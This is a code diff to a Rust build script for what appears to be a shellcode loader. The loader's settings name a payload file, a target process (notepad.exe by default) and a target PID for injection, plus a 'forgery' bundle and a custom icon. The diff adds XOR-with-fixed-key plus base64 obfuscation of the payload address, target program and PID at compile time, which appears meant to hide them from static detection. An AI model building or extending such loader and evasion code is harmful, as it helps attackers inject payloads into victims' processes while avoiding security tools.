@@ -1,6 +1,13 @@
 extern crate embed_resource;
 include!("src/thunk.rs");
 use std::{env, fs};
+use base64::{Engine as _, engine::general_purpose};
+
+fn simple_encrypt(data: &[u8]) -> String {
+    let key = b"rsl_secret_key_2025";
+    let encrypted: Vec<u8> = data.iter().enumerate().map(|(i, &b)| b ^ key[i % key.len()]).collect();
+    general_purpose::STANDARD.encode(&encrypted)
+}
 
 fn main() {
     // Environment variables to watch for changes
@@ -12,40 +19,43 @@ fn main() {
         "RSL_ICON_PATH",
         "RSL_BUNDLE_FILE",
         "RSL_BUNDLE_FILENAME",
-        "RSL_DEFAULT_PAYLOAD_ADDRESS",
-        "RSL_GUI_DEFAULT_PAYLOAD_ADDRESS",
+        "RSL_DEFAULT_PAYLOAD_ADDRESS"
     ];
 
     for var in &env_vars {
         println!("cargo:rerun-if-env-changed={}", var);
     }
 
-    // Set compile-time environment variable for bundle filename
-    let bundle_filename = env::var("RSL_BUNDLE_FILENAME").unwrap_or_default();
-    println!("cargo:rustc-env=RSL_BUNDLE_FILENAME={}", bundle_filename);
+    // Set compile-time environment variable for bundle filename if with_forgery feature is enabled
+    if env::var("CARGO_FEATURE_WITH_FORGERY").is_ok() {
+        let bundle_filename = env::var("RSL_BUNDLE_FILENAME").unwrap_or_default();
+        println!("cargo:rustc-env=RSL_BUNDLE_FILENAME={}", bundle_filename);
+        copy_bundle_file();
+    }
 
-    // Set compile-time environment variable for default payload address
-    let default_payload_address = env::var("RSL_DEFAULT_PAYLOAD_ADDRESS").unwrap_or_else(|_| "encrypt.bin".to_string());
-    println!("cargo:rustc-env=RSL_DEFAULT_PAYLOAD_ADDRESS={}", default_payload_address);
+    // Encrypt default payload address if load_payload_cmdline feature is enabled
+    if env::var("CARGO_FEATURE_LOAD_PAYLOAD_CMDLINE").is_ok() {
+        let default_payload_address = env::var("RSL_DEFAULT_PAYLOAD_ADDRESS").unwrap_or_else(|_| "encrypt.bin".to_string());
+        println!("cargo:rustc-env=RSL_ENCRYPTED_DEFAULT_PAYLOAD_ADDRESS={}", simple_encrypt(default_payload_address.as_bytes()));
+    }
 
-    // Set compile-time environment variable for target program
-    let target_program = env::var("RSL_TARGET_PROGRAM").unwrap_or_else(|_| r"notepad.exe".to_string());
-    println!("cargo:rustc-env=RSL_TARGET_PROGRAM={}", target_program);
+    // Encrypt target program if pattern2 feature is enabled
+    if env::var("CARGO_FEATURE_PATTERN2").is_ok() {
+        let target_program = env::var("RSL_TARGET_PROGRAM").unwrap_or_else(|_| r"notepad.exe".to_string());
+        println!("cargo:rustc-env=RSL_ENCRYPTED_TARGET_PROGRAM={}", simple_encrypt(target_program.as_bytes()));
+    }
 
-    // Set compile-time environment variable for target PID
-    let target_pid = env::var("RSL_TARGET_PID").unwrap_or_else(|_| "0".to_string());
-    println!("cargo:rustc-env=RSL_TARGET_PID={}", target_pid);
+    // Encrypt target PID if pattern3 feature is enabled
+    if env::var("CARGO_FEATURE_PATTERN3").is_ok() {
+        let target_pid = env::var("RSL_TARGET_PID").unwrap_or_else(|_| "0".to_string());
+        println!("cargo:rustc-env=RSL_ENCRYPTED_TARGET_PID={}", simple_encrypt(target_pid.as_bytes()));
+    }
 
     // Conditional compilation tasks
     if env::var("CARGO_FEATURE_WIN7").is_ok() {
         println!("cargo:note=Win7 Enabled, executing thunk");
         thunk();
     }
-
-    if env::var("CARGO_FEATURE_WITH_FORGERY").is_ok() {
-        copy_bundle_file();
-    }
-
     generate_icon_rc();
     embed_resource::compile("icon.rc");
 }
